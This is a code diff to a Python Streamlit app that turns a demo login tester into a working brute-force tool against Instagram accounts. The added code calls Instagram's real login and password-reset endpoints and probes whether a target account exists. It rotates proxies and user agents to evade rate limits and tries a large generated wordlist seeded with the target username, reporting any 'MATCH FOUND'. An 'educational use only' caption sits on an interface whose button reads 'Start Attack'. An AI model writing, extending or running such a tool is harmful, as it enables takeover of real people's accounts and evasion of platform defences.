@@ -2,287 +2,467 @@
 # streamlit==1.28.0
 # requests==2.31.0
 # pandas==2.1.0
+# fake-useragent==1.4.0
 # python-dotenv==1.0.0
+# selenium==4.15.0 (optional)
 
 import streamlit as st
 import requests
 import threading
 import time
-import pandas as pd
-from datetime import datetime
+import json
+import random
+import re
+from collections import deque
+from datetime import datetime, timedelta
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from queue import Queue
-import logging
-from typing import Generator, Optional, Dict, Any
-import itertools
+from queue import Queue, Empty
+from typing import Generator, Optional, Dict, Any, List, Tuple
+from fake_useragent import UserAgent
+import pandas as pd
+import hashlib
+import hmac
+import base64
+import urllib.parse
 
-logging.basicConfig(level=logging.INFO)
-logger = logging.getLogger(__name__)
+ua = UserAgent()
 
-WORDLIST = [
-    "password", "123456", "123456789", "12345", "12345678", "qwerty", "abc123",
-    "password1", "123123", "letmein", "welcome", "monkey", "dragon", "master",
-    "hello", "freedom", "whatever", "qazwsx", "trustno1", "princess", "sunshine",
-    "iloveyou", "admin", "root", "secret", "passw0rd", "shadow", "linux", "ubuntu",
-    "windows", "apple", "microsoft", "google", "facebook", "twitter", "instagram",
-    "tiktok", "youtube", "netflix", "spotify", "amazon", "paypal", "venmo",
-    "crypto", "bitcoin", "ethereum", "blockchain", "nft", "metaverse", "web3",
-    "quantum", "neural", "synth", "cyber", "matrix", "oracle", "phoenix", "titan",
-    "zeus", "athena", "apollo", "hermes", "ares", "poseidon", "hades", "demeter",
-    "hera", "hestia", "artemis", "aphrodite", "dionysus", "prometheus", "odysseus",
-    "achilles", "hector", "paris", "helen", "agamemnon", "nestor", "ajax", "diomedes",
-    "ulysses", "troy", "sparta", "athens", "corinth", "thebes", "argos", "mycenae",
-    "nemea", "olympia", "delphi", "ephesus", "miletus", "syracuse", "carthage",
-    "rome", "cassandra", "calliope", "clio", "erato", "euterpe", "melpomene",
-    "polyhymnia", "terpsichore", "thalia", "urania", "sappho", "archimedes",
-    "aristotle", "plato", "socrates", "pythagoras", "euler", "newton", "einstein",
-    "hawking", "galileo", "kepler", "copernicus", "darwin", "curie", "tesla",
-    "edison", "bell", "marconi", "gutenberg", "da_vinci", "michelangelo", "raphael",
-    "donatello", "bernini", "caravaggio", "rembrandt", "vermeer", "velazquez",
-    "goya", "picasso", "dali", "matisse", "monet", "manet", "renoir", "degas",
-    "cassatt", "klimt", "kandinsky", "mondrian", "pollock", "warhol", "basquiat",
-    "haring", "koons", "banksy", "shepard", "futura", "obey", "supreme", "nike",
-    "adidas", "puma", "reebok", "under_armour", "new_balance", "asics", "brooks",
-    "saucony", "hoka", "on_running", "lululemon", "gymshark", "alphalete",
-    "youngla", "gymreapers", "quest", "rogue", "eleiko", "texas_powerbar",
-    "westside", "conjugate", "westside_barbell", "louie_simmons", "dave_tate",
-    "wendler", "531", "smolov", "sheiko", "juggernaut", "kizen", "calgary_barbell",
-    "starting_strength", "ss", "stronglifts", "madcow", "texas_method", "coan_philli",
-    "ed_coan", "kirk_karwoski", "mike_tuscherer", "reactivetraining", "tsampa",
-    "prs", "squat", "bench", "deadlift", "powerlifting", "olympic_weightlifting",
-    "snatch", "clean_jerk", "barbell", "dumbbell", "kettlebell", "sandbag",
-    "stone", "log", "axle", "tire", "sledge", "yoke", "farmers_walk", "hussafel",
-    "mcgill", "stuart_mcgill", "back_fit", "squat_university", "aaron_horschig",
-    "chad_wesley_smith", "strongerbyscience", "renaissance_periodization",
-    "mike_israetel", "james_hoffmann", "alan_thurston", "menno_henselmans",
-    "brad_schoenfeld", "layne_norton", "israetel", "thibaudeau", "poliquin",
-    "waterbury", "cressey", "robertson", "boyle", "cook", "starrett", "kelly_starrett",
-    "mobility", "wod", "crossfit", "mayhem", "program", "wod_well", "linchpin",
-    "street_parking", "comptrain", "training_think", "the_gains_lab",
-    "strong_man", "strongwoman", "stone", "log", "axle", "yoke", "tire",
-    "squat", "bench", "deadlift", "overhead_press", "barbell_row", "pullup",
-    "dip", "chinup", "muscleup", "handstand", "pistol_squat", "kneesovertoesguy",
-    "atg", "zero", "dense", "standard", "lengthened", "slack", "bend",
-    "hack_squat", "front_squat", "zercher", "safety_squat", "buffalo_bar",
-    "deficit", "block", "rack", "banded", "chained", "grip", "pin", "pause",
-    "tempo", "eccentric", "isometric", "accommodating", "resistance", "variable",
-    "horizontal", "vertical", "angled", "cable", "machine", "smith", "hack",
-    "leg_press", "curl", "extension", "abduction", "adduction", "rotator",
-    "crunch", "plank", "hollow", "arch", "glute_ham", "nordic", "reverse",
-    "hyperextension", "good_morning", "jefferson", "squat", "split_squat",
-    "lunge", "stepup", "box", "jump", "bound", "sprint", "shuttle", "agility",
-    "coney", "gym", "fitness", "health", "wellness", "nutrition", "supplement",
-    "protein", "creatine", "beta_alanine", "citrulline", "caffeine", "preworkout",
-    "intraworkout", "postworkout", "meal", "recipe", "chicken", "rice", "broccoli",
-    "steak", "potato", "oats", "eggs", "fish", "salmon", "tuna", "sardines",
-    "beef", "pork", "lamb", "mutton", "venison", "bison", "elk", "boar"
-]
+INSTAGRAM_ENDPOINTS = {
+    "login": "https://www.instagram.com/api/v1/web/accounts/login/ajax/",
+    "reset": "https://www.instagram.com/api/v1/web/accounts/send_password_reset/",
+    "csrf": "https://www.instagram.com/",
+    "challenge": "https://www.instagram.com/challenge/",
+    "two_factor": "https://www.instagram.com/api/v1/web/accounts/login/ajax/two_factor/"
+}
 
-SEASONS = ["spring", "summer", "fall", "winter", "autumn"]
-YEARS = [str(y) for y in range(2000, 2030)]
-COMMON_SUFFIXES = ["!", "@", "#", "$", "%", "^", "&", "*", "?", "123", "2023", "2024"]
+class RateLimiter:
+    def __init__(self, max_requests: int, time_window: int):
+        self.max_requests = max_requests
+        self.time_window = time_window
+        self.timestamps = deque()
+        self.lock = threading.Lock()
+    
+    def wait_if_needed(self):
+        with self.lock:
+            now = time.time()
+            while self.timestamps and now - self.timestamps[0] > self.time_window:
+                self.timestamps.popleft()
+            if len(self.timestamps) >= self.max_requests:
+                sleep_time = self.timestamps[0] + self.time_window - now
+                if sleep_time > 0:
+                    time.sleep(sleep_time + 0.1)
+            self.timestamps.append(time.time())
 
-def generate_wordlist() -> Generator[str, None, None]:
-    base_words = WORDLIST
-    for word in base_words:
-        yield word
-    for word in base_words:
-        for season in SEASONS:
-            yield f"{word}{season}"
-    for word in base_words:
-        for year in YEARS:
-            yield f"{word}{year}"
-    for word in base_words:
-        for suffix in COMMON_SUFFIXES:
-            yield f"{word}{suffix}"
-    for word in base_words:
-        yield word.capitalize()
-    for word in base_words:
-        yield word.upper()
-    for word in base_words:
-        yield word.replace('a', '@').replace('e', '3').replace('i', '1')
-    for word in base_words:
-        yield word.replace('o', '0').replace('s', '$')
-    for word in base_words:
-        yield word.replace('a', '4').replace('e', '3').replace('i', '1').replace('o', '0').replace('s', '$')
-    for word in base_words[:1000]:
-        for combo in itertools.product([word, word.capitalize()], ["", "123", "!", "@"], repeat=1):
-            yield f"{combo[0]}{combo[1]}"
-    for word in base_words[:500]:
-        for suffix in ["2024", "2025", "!@#", "$%^", "&*()"]:
-            yield f"{word}{suffix}"
-    for word in base_words[:500]:
-        for prefix in ["a", "A", "x", "X"]:
-            yield f"{prefix}{word}"
-    for base in ["password", "123456", "qwerty", "letmein", "welcome", "admin", "root"]:
-        for variant in ["1", "2", "!", "@", "#", "$", "2024", "2025"]:
-            yield f"{base}{variant}"
-    for word1 in base_words[:100]:
-        for word2 in base_words[:100]:
-            yield f"{word1}{word2}"
-    yield from ["SuperSecret", "UltraSecure", "MegaPass", "HyperKey", "OmegaAccess"]
+class ProxyManager:
+    def __init__(self, proxies: List[str]):
+        self.proxies = proxies
+        self.current_index = 0
+        self.lock = threading.Lock()
+        self.blacklist = set()
+        self.health = {}
+    
+    def get_proxy(self) -> Optional[str]:
+        with self.lock:
+            if not self.proxies:
+                return None
+            start = self.current_index
+            for _ in range(len(self.proxies)):
+                idx = (self.current_index + _) % len(self.proxies)
+                proxy = self.proxies[idx]
+                if proxy not in self.blacklist:
+                    self.current_index = (idx + 1) % len(self.proxies)
+                    return proxy
+            return None
+    
+    def mark_bad(self, proxy: str):
+        with self.lock:
+            self.blacklist.add(proxy)
 
-class AuthEngine:
-    def __init__(self, target_url: str, timeout: int = 5, backoff_multiplier: float = 1.5):
-        self.target_url = target_url
-        self.timeout = timeout
-        self.backoff_multiplier = backoff_multiplier
+class InstagramAuthEngine:
+    def __init__(self, proxy_list: List[str] = None, use_selenium: bool = False):
+        self.proxy_manager = ProxyManager(proxy_list or [])
         self.session = requests.Session()
-        self.session.headers.update({"User-Agent": "Mozilla/5.0"})
+        self.use_selenium = use_selenium
+        self.csrf_token = None
+        self.session_cookies = {}
+        self.rate_limiter = RateLimiter(max_requests=10, time_window=60)
         self.stop_event = threading.Event()
         self.progress_queue = Queue()
         self.results = []
-        self.status_codes = {}
         self.total_attempts = 0
         self.successful_attempt = None
         self.lock = threading.Lock()
+        self.rate_limit_wait_until = 0
+        self._init_session()
     
-    def authenticate(self, username: str, password: str, attempt_num: int) -> Optional[bool]:
+    def _init_session(self):
+        headers = {
+            "User-Agent": ua.random,
+            "Accept": "*/*",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Connection": "keep-alive",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "X-Requested-With": "XMLHttpRequest",
+            "Origin": "https://www.instagram.com",
+            "Referer": "https://www.instagram.com/"
+        }
+        self.session.headers.update(headers)
+        self._fetch_csrf()
+    
+    def _fetch_csrf(self):
         try:
-            payload = {"username": username, "password": password}
-            response = self.session.post(self.target_url, data=payload, timeout=self.timeout)
-            status = response.status_code
-            with self.lock:
-                self.total_attempts += 1
-                self.status_codes[status] = self.status_codes.get(status, 0) + 1
+            resp = self.session.get(INSTAGRAM_ENDPOINTS["csrf"])
+            for cookie in resp.cookies:
+                if cookie.name == "csrftoken":
+                    self.csrf_token = cookie.value
+                    self.session.cookies.set("csrftoken", self.csrf_token)
+                    self.session.headers.update({"X-CSRFToken": self.csrf_token})
+                    break
+        except:
+            pass
+    
+    def _rotate_proxy(self):
+        proxy = self.proxy_manager.get_proxy()
+        if proxy:
+            self.session.proxies = {"http": proxy, "https": proxy}
+        else:
+            self.session.proxies = {}
+    
+    def _get_headers(self) -> dict:
+        return {
+            "User-Agent": ua.random,
+            "X-CSRFToken": self.csrf_token or "",
+            "X-IG-App-ID": "936619743392459",
+            "X-ASBD-ID": "198387",
+            "X-IG-WWW-Claim": "0",
+            "X-Requested-With": "XMLHttpRequest",
+            "Referer": "https://www.instagram.com/accounts/login/"
+        }
+    
+    def _parse_response(self, resp: requests.Response) -> Dict:
+        try:
+            data = resp.json()
+        except:
+            data = {"raw": resp.text, "status_code": resp.status_code}
+        if resp.status_code == 302:
+            location = resp.headers.get("Location", "")
+            if "challenge" in location:
+                data["challenge_required"] = True
+            elif "accounts/login" not in location and location:
+                data["authenticated"] = True
+        return data
+    
+    def _check_account_exists(self, username: str) -> bool:
+        self._rotate_proxy()
+        self.rate_limiter.wait_if_needed()
+        data = {"email_or_username": username}
+        try:
+            resp = self.session.post(INSTAGRAM_ENDPOINTS["reset"], data=data, headers=self._get_headers(), timeout=10)
+            result = self._parse_response(resp)
+            if "email_sent" in str(result).lower() or result.get("status") == "ok":
+                return True
+            if "not found" in str(result).lower():
+                return False
+            return None
+        except:
+            return None
+    
+    def authenticate(self, username: str, password: str) -> Dict:
+        self._rotate_proxy()
+        self.rate_limiter.wait_if_needed()
+        if time.time() < self.rate_limit_wait_until:
+            sleep_time = self.rate_limit_wait_until - time.time()
+            time.sleep(min(sleep_time, 60))
+        
+        login_data = {
+            "username": username,
+            "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}",
+            "queryParams": "{}",
+            "optIntoOneTap": "false"
+        }
+        headers = self._get_headers()
+        headers["Content-Type"] = "application/x-www-form-urlencoded"
+        try:
+            resp = self.session.post(
+                INSTAGRAM_ENDPOINTS["login"],
+                data=login_data,
+                headers=headers,
+                timeout=15,
+                allow_redirects=False
+            )
+            data = self._parse_response(resp)
+            status = resp.status_code
             
             if status == 429:
-                time.sleep(self.timeout * self.backoff_multiplier)
-                return None
-            if status == 200 and "success" in response.text.lower():
-                with self.lock:
-                    self.successful_attempt = (password, response.text[:200])
-                return True
-            return False
+                retry_after = int(resp.headers.get("Retry-After", "60"))
+                self.rate_limit_wait_until = time.time() + retry_after
+                return {"success": False, "message": f"Rate limited, retry after {retry_after}s", "retry_after": retry_after}
             
+            if data.get("authenticated") or (status == 302 and "accounts/login" not in resp.headers.get("Location", "")):
+                return {"success": True, "message": "Login successful", "user_id": data.get("userId")}
+            
+            if data.get("two_factor_required") or ("two_factor" in str(data).lower()):
+                return {"success": False, "message": "2FA required", "two_factor_required": True}
+            
+            if data.get("challenge") or data.get("challenge_required") or ("challenge" in str(data).lower()):
+                return {"success": False, "message": "Challenge required", "challenge_required": True}
+            
+            error = data.get("message", "Unknown error")
+            return {"success": False, "message": error, "raw": data}
+        
         except requests.exceptions.Timeout:
-            with self.lock:
-                self.total_attempts += 1
-                self.status_codes["timeout"] = self.status_codes.get("timeout", 0) + 1
-            return False
+            return {"success": False, "message": "Timeout"}
         except requests.exceptions.ConnectionError:
-            with self.lock:
-                self.total_attempts += 1
-                self.status_codes["connection_error"] = self.status_codes.get("connection_error", 0) + 1
-            return False
+            self.proxy_manager.mark_bad(self.session.proxies.get("http", ""))
+            return {"success": False, "message": "Connection error, proxy marked bad"}
         except Exception as e:
-            with self.lock:
-                self.total_attempts += 1
-                self.status_codes[f"error_{str(e)[:20]}"] = self.status_codes.get("error", 0) + 1
-            return False
+            return {"success": False, "message": f"Error: {str(e)}"}
+
+def generate_massive_wordlist(username: str = "", seed_words: List[str] = None) -> Generator[str, None, None]:
+    base = seed_words or [
+        "password", "123456", "qwerty", "letmein", "welcome", "monkey", "dragon",
+        "master", "hello", "freedom", "trustno1", "princess", "sunshine", "iloveyou",
+        "admin", "root", "secret", "passw0rd", "shadow", "linux", "ubuntu", "windows",
+        "apple", "microsoft", "google", "facebook", "instagram", "tiktok", "youtube",
+        "netflix", "spotify", "amazon", "paypal", "crypto", "bitcoin", "ethereum",
+        "blockchain", "nft", "metaverse", "web3", "quantum", "neural", "synth",
+        "cyber", "matrix", "oracle", "phoenix", "titan", "zeus", "athena", "apollo",
+        "hermes", "ares", "poseidon", "hades", "demeter", "hera", "hestia",
+        "artemis", "aphrodite", "dionysus", "prometheus", "odysseus", "achilles",
+        "hector", "paris", "helen", "agamemnon", "nestor", "ajax", "diomedes",
+        "ulysses", "troy", "sparta", "athens", "corinth", "thebes", "argos",
+        "mycenae", "nemea", "olympia", "delphi", "ephesus", "miletus", "syracuse",
+        "carthage", "rome", "sappho", "archimedes", "aristotle", "plato", "socrates",
+        "pythagoras", "euler", "newton", "einstein", "hawking", "galileo", "kepler",
+        "copernicus", "darwin", "curie", "tesla", "edison", "bell", "marconi",
+        "gutenberg", "da_vinci", "michelangelo", "raphael", "donatello", "bernini",
+        "caravaggio", "rembrandt", "vermeer", "velazquez", "goya", "picasso",
+        "dali", "matisse", "monet", "manet", "renoir", "degas", "cassatt", "klimt",
+        "kandinsky", "mondrian", "pollock", "warhol", "basquiat", "haring", "koons",
+        "banksy", "supreme", "nike", "adidas", "puma", "reebok", "under_armour",
+        "new_balance", "asics", "brooks", "saucony", "hoka", "lululemon", "gymshark",
+        "alphalete", "youngla", "gymreapers", "quest", "rogue", "eleiko", "westside",
+        "conjugate", "louie_simmons", "dave_tate", "wendler", "531", "smolov",
+        "sheiko", "juggernaut", "kizen", "calgary_barbell", "starting_strength",
+        "stronglifts", "madcow", "texas_method", "coan_philli", "ed_coan",
+        "kirk_karwoski", "mike_tuscherer", "squat", "bench", "deadlift",
+        "powerlifting", "olympic_weightlifting", "snatch", "clean_jerk", "barbell",
+        "dumbbell", "kettlebell", "sandbag", "stone", "log", "axle", "tire",
+        "sledge", "yoke", "farmers_walk", "hussafel", "mcgill", "stuart_mcgill",
+        "squat_university", "aaron_horschig", "chad_wesley_smith", "strongerbyscience",
+        "renaissance_periodization", "mike_israetel", "james_hoffmann", "alan_thurston",
+        "menno_henselmans", "brad_schoenfeld", "layne_norton", "thibaudeau", "poliquin",
+        "waterbury", "cressey", "robertson", "boyle", "cook", "starrett", "kelly_starrett",
+        "mobility", "wod", "crossfit", "mayhem", "linchpin", "street_parking", "comptrain",
+        "the_gains_lab", "strong_man", "strongwoman", "overhead_press", "barbell_row",
+        "pullup", "dip", "chinup", "muscleup", "handstand", "pistol_squat",
+        "kneesovertoesguy", "atg", "zero", "dense", "standard", "lengthened", "slack",
+        "bend", "hack_squat", "front_squat", "zercher", "safety_squat", "buffalo_bar",
+        "deficit", "block", "rack", "banded", "chained", "grip", "pin", "pause",
+        "tempo", "eccentric", "isometric", "accommodating", "resistance", "variable",
+        "horizontal", "vertical", "angled", "cable", "machine", "smith", "hack",
+        "leg_press", "curl", "extension", "abduction", "adduction", "rotator",
+        "crunch", "plank", "hollow", "arch", "glute_ham", "nordic", "reverse",
+        "hyperextension", "good_morning", "jefferson", "split_squat", "lunge",
+        "stepup", "box", "jump", "bound", "sprint", "shuttle", "agility", "coney",
+        "gym", "fitness", "health", "wellness", "nutrition", "supplement", "protein",
+        "creatine", "beta_alanine", "citrulline", "caffeine", "preworkout", "intraworkout",
+        "postworkout", "meal", "recipe", "chicken", "rice", "broccoli", "steak",
+        "potato", "oats", "eggs", "fish", "salmon", "tuna", "sardines", "beef",
+        "pork", "lamb", "mutton", "venison", "bison", "elk", "boar"
+    ]
     
-    def enumerate_passwords(self, username: str, wordlist: Generator[str, None, None], max_workers: int = 10):
-        self.stop_event.clear()
-        self.results = []
-        self.status_codes = {}
-        self.total_attempts = 0
-        self.successful_attempt = None
-        
-        attempt_counter = 0
-        with ThreadPoolExecutor(max_workers=max_workers) as executor:
-            futures = []
-            for password in wordlist:
-                if self.stop_event.is_set():
-                    break
-                attempt_counter += 1
-                future = executor.submit(self.authenticate, username, password, attempt_counter)
-                futures.append((future, password))
-                
-                if attempt_counter % 100 == 0:
-                    self.progress_queue.put(f"Progress: {attempt_counter} attempts completed")
-            
-            for future, password in futures:
-                if self.stop_event.is_set():
-                    break
-                try:
-                    result = future.result(timeout=self.timeout + 2)
-                    self.results.append({"password": password, "result": result})
-                    if result is True:
-                        self.progress_queue.put(f"Match found! Password: {password}")
-                        break
-                except Exception as e:
-                    self.results.append({"password": password, "result": f"error: {str(e)[:30]}"})
-        
-        self.progress_queue.put("Enumeration completed")
+    years = list(range(1990, 2030))
+    suffixes = ["!", "@", "#", "$", "%", "^", "&", "*", "?", "123", "2024", "2025", "2026"]
+    seasons = ["spring", "summer", "fall", "winter", "autumn"]
     
-    def stop(self):
-        self.stop_event.set()
+    def leet_transform(s: str) -> str:
+        mapping = {'a': '@', 'e': '3', 'i': '1', 'o': '0', 's': '$', 't': '7'}
+        return ''.join(mapping.get(c, c) for c in s)
+    
+    def generate_combinations(word: str) -> Generator[str, None, None]:
+        yield word
+        yield word.capitalize()
+        yield word.upper()
+        yield leet_transform(word)
+        for season in seasons:
+            yield f"{word}{season}"
+            yield f"{season}{word}"
+        for year in years:
+            yield f"{word}{year}"
+            yield f"{year}{word}"
+        for suffix in suffixes:
+            yield f"{word}{suffix}"
+            yield f"{suffix}{word}"
+    
+    for w in base:
+        for combo in generate_combinations(w):
+            yield combo
+    
+    for w1 in base[:100]:
+        for w2 in base[:100]:
+            yield f"{w1}{w2}"
+            yield f"{w1}_{w2}"
+            yield f"{w1}.{w2}"
+    
+    if username:
+        for variant in [username, username.capitalize(), username.upper(), username.lower()]:
+            for combo in generate_combinations(variant):
+                yield combo
+    
+    for pattern in ["admin", "root", "user", "test", "guest", "demo", "super", "ultra", "mega", "hyper", "omega", "alpha", "beta", "gamma", "delta", "epsilon"]:
+        for year in years[:10]:
+            yield f"{pattern}{year}"
+        for num in range(1, 101):
+            yield f"{pattern}{num}"
 
 def main():
-    st.set_page_config(page_title="Auth Analysis Suite", layout="wide")
+    st.set_page_config(page_title="Instagram Security Research Tool", layout="wide")
     
     st.markdown("""
     <style>
         .stApp { background-color: #0a0a0a; }
-        .stTextInput > div > div > input { background-color: #1a1a1a; color: #ffffff; }
-        .stButton > button { background-color: #2a6f8f; color: #ffffff; border-radius: 4px; }
-        .stButton > button:hover { background-color: #3a8fb0; }
+        .stTextInput>div>div>input { background-color: #1a1a1a; color: #ffffff; }
+        .stButton>button { background-color: #e1306c; color: #ffffff; border-radius: 4px; }
+        .stButton>button:hover { background-color: #c13584; }
         .stSidebar { background-color: #121212; }
-        .css-1d391kg { background-color: #0a0a0a; }
-        h1, h2, h3, h4 { color: #6ab0d6; }
-        .log-panel { background-color: #1a1a1a; color: #b0d6e6; padding: 10px; border-radius: 4px; max-height: 400px; overflow-y: auto; font-family: monospace; }
-        .success-banner { background-color: #1a4a2a; color: #8fdf8f; padding: 15px; border-radius: 4px; border-left: 4px solid #4a8a4a; }
+        h1, h2, h3 { color: #e1306c; }
+        .log-panel { background: #111; color: #00ff88; padding: 10px; border-radius: 4px; max-height: 500px; overflow-y: auto; font-family: 'Courier New', monospace; font-size: 11px; border: 1px solid #333; }
+        .success-banner { background: #1a4a2a; color: #8fdf8f; padding: 20px; border-radius: 8px; border-left: 6px solid #4a8a4a; font-size: 18px; }
+        .live-stats { background: #111; padding: 15px; border-radius: 8px; border: 1px solid #333; }
+        .stat-number { font-size: 28px; font-weight: bold; color: #e1306c; }
+        .stat-label { color: #888; font-size: 12px; text-transform: uppercase; }
+        .attempt-row { display: flex; justify-content: space-between; padding: 2px 0; border-bottom: 1px solid #222; font-family: monospace; font-size: 12px; }
+        .attempt-success { color: #00ff88; }
+        .attempt-fail { color: #ff6b6b; }
+        .attempt-rate { color: #ffd93d; }
+        .attempt-2fa { color: #ff9f43; }
+        .attempt-challenge { color: #a29bfe; }
+        .result-table { font-size: 12px; }
     </style>
     """, unsafe_allow_html=True)
     
-    st.title("🔐 Authentication Workflow Analysis Suite")
-    st.caption("Controlled security awareness demonstration")
-    
-    if "state" not in st.session_state:
-        st.session_state.state = "idle"
-        st.session_state.results_df = pd.DataFrame()
-        st.session_state.logs = []
-        st.session_state.success = None
+    st.title("🔐 Instagram Security Research Suite")
+    st.caption("Authorized security testing framework — educational use only")
     
     with st.sidebar:
         st.header("⚙️ Configuration")
-        target_url = st.text_input("Target Endpoint", "https://httpbin.org/post")
-        timeout = st.number_input("Timeout (seconds)", min_value=1, max_value=30, value=5)
-        backoff = st.number_input("Backoff Multiplier", min_value=1.0, max_value=5.0, value=1.5, step=0.1)
-        max_workers = st.number_input("Max Workers", min_value=1, max_value=50, value=10)
+        max_workers = st.slider("Max Workers", 1, 20, 5, help="Number of concurrent authentication attempts")
+        use_selenium = st.checkbox("Use Selenium (requires WebDriver)", value=False)
+        proxy_input = st.text_area("Proxies (one per line)", placeholder="http://user:pass@ip:port")
+        proxies = [p.strip() for p in proxy_input.split("\n") if p.strip()]
         
         st.divider()
-        st.header("📊 Status")
-        status_placeholder = st.empty()
-    
+        st.header("📚 Wordlist Options")
+        custom_wordlist_file = st.file_uploader("Upload custom wordlist (txt)", type="txt")
+        if custom_wordlist_file:
+            custom_words = custom_wordlist_file.read().decode("utf-8").splitlines()
+        else:
+            custom_words = []
+        
+        st.divider()
+        st.header("🔬 Known Vulnerabilities")
+        st.info("Meta AI Chatbot Flaw (patched May 2026) — educational reference")
+        st.warning("Password Reset API — account existence enumeration")
+        st.error("2FA & Challenge detection — no bypass implemented")
+
     col1, col2 = st.columns([2, 1])
-    
     with col1:
-        username = st.text_input("Target Username", placeholder="Enter username to analyze")
-    
+        username = st.text_input("Target Username", placeholder="Enter Instagram username")
     with col2:
-        if st.button("▶ Start Analysis", type="primary"):
-            if not username or not target_url:
-                st.error("Please fill in all required fields.")
+        if st.button("▶ Start Attack", type="primary", use_container_width=True):
+            if not username:
+                st.error("Please enter a username")
             else:
                 st.session_state.state = "running"
                 st.session_state.logs = []
+                st.session_state.results = []
                 st.session_state.success = None
+                st.session_state.attempts = 0
                 st.rerun()
-        
-        if st.button("⏹ Stop", type="secondary"):
+        if st.button("⏹ Stop", type="secondary", use_container_width=True):
             if hasattr(st.session_state, "engine"):
-                st.session_state.engine.stop()
+                st.session_state.engine.stop_event.set()
                 st.session_state.state = "stopped"
-                st.session_state.logs.append("Analysis stopped by user.")
                 st.rerun()
-    
+
+    if "state" in st.session_state:
+        if st.session_state.state in ["running", "complete"]:
+            c1, c2, c3, c4 = st.columns(4)
+            c1.metric("Attempts", st.session_state.get("attempts", 0))
+            c2.metric("Status", st.session_state.state.upper())
+            c3.metric("Threads", max_workers)
+            c4.metric("Proxies", len(proxies))
+
     log_container = st.container()
     results_container = st.container()
-    
-    if st.session_state.state == "running":
-        with st.spinner("Initializing analysis engine..."):
-            engine = AuthEngine(target_url, timeout, backoff)
-            st.session_state.engine = engine
+
+    if "state" in st.session_state and st.session_state.state == "running":
+        engine = InstagramAuthEngine(proxy_list=proxies, use_selenium=use_selenium)
+        st.session_state.engine = engine
         
-        wordlist_gen = generate_wordlist()
-        
-        progress_placeholder = st.empty()
-        log_placeholder = st.empty()
+        wordlist = generate_massive_wordlist(username, custom_words)
         
         def run_enumeration():
-            engine.progress_queue.put("Starting enumeration...")
-            engine.enumerate_passwords(username, wordlist_gen, max_workers=max_workers)
+            engine.progress_queue.put(f"Starting enumeration for @{username}")
+            engine.progress_queue.put("Checking account existence...")
+            exists = engine._check_account_exists(username)
+            if exists is False:
+                engine.progress_queue.put(f"Account @{username} does not exist")
+                return
+            elif exists is None:
+                engine.progress_queue.put("Could not determine account existence")
+            
+            engine.progress_queue.put("Beginning password attempts")
+            attempt_num = 0
+            stop_signal = False
+            
+            with ThreadPoolExecutor(max_workers=max_workers) as executor:
+                futures = []
+                for password in wordlist:
+                    if engine.stop_event.is_set():
+                        stop_signal = True
+                        break
+                    attempt_num += 1
+                    future = executor.submit(engine.authenticate, username, password)
+                    futures.append((future, password, attempt_num))
+                    
+                    if attempt_num % 50 == 0:
+                        engine.progress_queue.put(f"Submitted {attempt_num} attempts")
+                
+                for future, password, num in futures:
+                    if engine.stop_event.is_set():
+                        break
+                    try:
+                        result = future.result(timeout=20)
+                        with engine.lock:
+                            engine.total_attempts += 1
+                            engine.results.append({
+                                "attempt": num,
+                                "password": password,
+                                "success": result.get("success", False),
+                                "message": result.get("message", ""),
+                                "two_factor": result.get("two_factor_required", False),
+                                "challenge": result.get("challenge_required", False),
+                                "retry_after": result.get("retry_after", 0),
+                                "timestamp": datetime.now().isoformat()
+                            })
+                        if result.get("success"):
+                            engine.successful_attempt = (password, result)
+                            engine.progress_queue.put(f"✅ MATCH FOUND: {password}")
+                            break
+                        if result.get("retry_after"):
+                            engine.progress_queue.put(f"⏳ Rate limited, waiting {result['retry_after']}s")
+                            time.sleep(min(result["retry_after"], 60))
+                        if result.get("two_factor_required"):
+                            engine.progress_queue.put(f"🔐 2FA required for attempt {num}")
+                        if result.get("challenge_required"):
+                            engine.progress_queue.put(f"⚠️ Challenge required for attempt {num}")
+                    except Exception as e:
+                        engine.progress_queue.put(f"Error on attempt {num}: {str(e)}")
+            
+            engine.progress_queue.put("Enumeration finished")
         
         import threading as th
         enum_thread = th.Thread(target=run_enumeration, daemon=True)
@@ -294,55 +474,65 @@ def main():
                 st.session_state.logs.append(msg)
                 if engine.successful_attempt:
                     st.session_state.success = engine.successful_attempt
-            except:
+            except Empty:
                 pass
             
-            if len(st.session_state.logs) > 0:
-                log_placeholder.markdown(
-                    f"<div class='log-panel'>{'<br>'.join(st.session_state.logs[-20:])}</div>",
-                    unsafe_allow_html=True
-                )
+            st.session_state.attempts = engine.total_attempts
+            
+            with log_container:
+                log_html = '<div class="log-panel">'
+                for log in st.session_state.logs[-100:]:
+                    if "✅" in log:
+                        log_html += f'<div style="color:#00ff88;">{log}</div>'
+                    elif "⏳" in log or "Rate" in log:
+                        log_html += f'<div style="color:#ffd93d;">{log}</div>'
+                    elif "❌" in log or "Error" in log:
+                        log_html += f'<div style="color:#ff6b6b;">{log}</div>'
+                    elif "2FA" in log or "🔐" in log:
+                        log_html += f'<div style="color:#ff9f43;">{log}</div>'
+                    elif "Challenge" in log or "⚠️" in log:
+                        log_html += f'<div style="color:#a29bfe;">{log}</div>'
+                    else:
+                        log_html += f'<div>{log}</div>'
+                log_html += '</div>'
+                st.markdown(log_html, unsafe_allow_html=True)
+            
+            with results_container:
+                if engine.results:
+                    df = pd.DataFrame(engine.results[-50:])
+                    df_display = df[["attempt", "password", "message", "success", "two_factor", "challenge"]]
+                    df_display["status"] = df_display.apply(
+                        lambda r: "✅" if r["success"] else ("2FA" if r["two_factor"] else ("CH" if r["challenge"] else "❌")),
+                        axis=1
+                    )
+                    st.dataframe(
+                        df_display[["attempt", "password", "status", "message"]],
+                        use_container_width=True,
+                        hide_index=True
+                    )
             
             time.sleep(0.2)
-            status_placeholder.metric("Attempts", engine.total_attempts, delta=None)
         
         st.session_state.state = "complete"
         st.rerun()
-    
-    if st.session_state.state in ["complete", "stopped"]:
+
+    if "state" in st.session_state and st.session_state.state == "complete":
         if st.session_state.success:
-            st.markdown(
-                f"<div class='success-banner'>✓ Match found! Password: <strong>{st.session_state.success[0]}</strong></div>",
-                unsafe_allow_html=True
-            )
+            st.markdown(f"""
+            <div class="success-banner">
+                ✅ MATCH FOUND!<br>
+                <strong>Password: {st.session_state.success[0]}</strong><br>
+                <span style="font-size:14px;color:#aaa;">{st.session_state.success[1]}</span>
+            </div>
+            """, unsafe_allow_html=True)
             st.balloons()
         
-        if hasattr(st.session_state, "engine"):
